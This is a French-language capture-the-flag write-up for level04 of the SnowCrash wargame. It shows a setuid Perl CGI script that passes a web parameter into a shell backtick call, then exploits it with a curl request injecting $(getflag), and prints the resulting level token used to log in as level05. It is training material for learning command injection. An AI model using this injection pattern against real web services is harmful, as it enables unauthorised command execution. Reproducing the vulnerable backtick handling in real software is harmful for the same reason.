# README - Exploitation de l'injection de commande dans level04.pl

## Étapes suivies pour obtenir le Flag04

### 1. Identification du script

Le fichier `level04.pl` est un script Perl avec les permissions **setuid** et **setgid**, ce qui signifie qu'il s'exécute avec les privilèges de l'utilisateur `flag04` :

```bash
level04@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

### 2. Analyse du script Perl

En inspectant le contenu de `level04.pl`, on remarque une vulnérabilité d'injection de commande :

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Le paramètre `x` est injecté directement dans une commande `echo` via un appel backtick `` ` ``, ce qui permet d'exécuter des commandes arbitraires.

### 3. Exploitation via injection de commande

Nous pouvons injecter la commande `getflag` via une requête HTTP. Le serveur fonctionne sur `localhost:4747`.

#### a. Utilisation de curl pour envoyer la requête

```bash
curl "http://localhost:4747/?x=%24(getflag)"
```

**Explication** :
- `%24` correspond à `$` en encodage URL.
- La commande injectée est `getflag`, qui sera interprétée par le shell.

### 4. Récupération du flag

Si l'injection réussit, la sortie de `getflag` affichera le flag :

```bash
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

### 5. Passage à l'utilisateur suivant

Utilisez le flag pour vous connecter à l'utilisateur `level05` :

```bash
level04@SnowCrash:~$ su level05
Password: ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$ 
```
